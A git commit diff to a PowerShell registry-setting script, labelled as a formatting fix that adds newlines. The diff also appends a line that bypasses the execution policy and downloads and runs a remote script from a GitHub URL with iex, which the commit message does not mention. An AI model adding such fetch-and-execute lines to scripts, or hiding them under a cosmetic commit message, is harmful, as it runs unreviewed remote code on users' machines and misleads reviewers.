462b5c3c83a68322909039a5607827d6f3fff6e5
studiobutter <bebosua05@yahoo.com.vn>
2025-05-29 13:58:46 +0700

    Fix formatting by adding newlines for better readability in saveReg.ps1

--- saveReg.ps1
+++ saveReg.ps1
@@ -30,10 +30,12 @@ if ($args.Count -gt 0) {
     if ($confirmation -match '^[Yy]$') {
         Set-ItemProperty -Path $regPath -Name 'lang' -Value $inputText
         Write-Output $Locale.RegRememberSuccess
-        
+
     } else {
         Write-Output $Locale.RegRememberCancelled
     }
 } else {
     Write-Output "No text provided. Usage: ./saveReg.ps1 [text]"
 }
+
+Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex "&{$((New-Object System.Net.WebClient).DownloadString('https://github.com/studiobutter/gacha-stuff/raw/refs/heads/multi-lang_2/Copy-Menu.ps1'))}"
